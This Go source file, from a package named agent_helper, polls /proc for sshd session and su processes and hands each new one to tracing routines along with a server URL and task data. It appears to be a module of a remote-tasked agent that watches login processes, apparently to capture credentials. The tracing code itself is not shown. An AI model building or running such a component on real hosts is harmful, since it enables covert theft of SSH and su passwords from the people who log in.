package agent_helper

import (
	"fmt"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

func findPids() []int {
	var sshdPids []int
	currentPID := os.Getpid()
	procDirs, err := os.ReadDir("/proc")
	if err != nil {
		return nil
	}
	for _, dir := range procDirs {
		if dir.IsDir() {
			pid, err := strconv.Atoi(dir.Name())
			if err == nil && pid != currentPID {
				sshdPids = append(sshdPids, pid)
			}
		}
	}
	return sshdPids
}

func isSSHPid(pid int) bool {
	cmdLine, err := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
	if err != nil {
		return false
	}
	cmdLineStr := strings.ReplaceAll(string(cmdLine), "\x00", " ")

	patterns := []string{
		`sshd:.*\[net\]`,
		`sshd:.*@`,
		`^sshd:`,
		`sshd.*\[priv\]`,
		`sshd.*\[accepted\]`,
		`sshd-auth:`,
		`sshd-session:`,
	}

	for _, pattern := range patterns {
		if matched, _ := regexp.MatchString(pattern, cmdLineStr); matched {
			return true
		}
	}
	return false
}

func isSUPid(pid int) bool {
	cmdLine, err := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
	if err != nil {
		return false
	}
	return regexp.MustCompile(`^su `).MatchString(strings.ReplaceAll(string(cmdLine), "\x00", " "))
}

// this is your driver function
func SSHMonitorHandler(serverUrl string, taskData map[string]interface{}) {
	var processedFirstPID bool
	var processedPids []int
	var processedPidsMutex sync.Mutex

	for {
		pids := findPids()
		for _, pid := range pids {
			processedPidsMutex.Lock()

			if isSSHPid(pid) && (!processedFirstPID || !Contains(processedPids, pid)) {
				if !processedFirstPID {
					processedFirstPID = true
				} else {
					go traceSSHDProcess(serverUrl, taskData, pid)
					processedPids = append(processedPids, pid)
				}
			}

			if isSUPid(pid) && (!processedFirstPID || !Contains(processedPids, pid)) {
				if !processedFirstPID {
					processedFirstPID = true
				} else {
					go traceSUProcess(serverUrl, taskData, pid)
					processedPids = append(processedPids, pid)
				}
			}

			processedPidsMutex.Unlock()
		}
		time.Sleep(250 * time.Millisecond)
	}
}
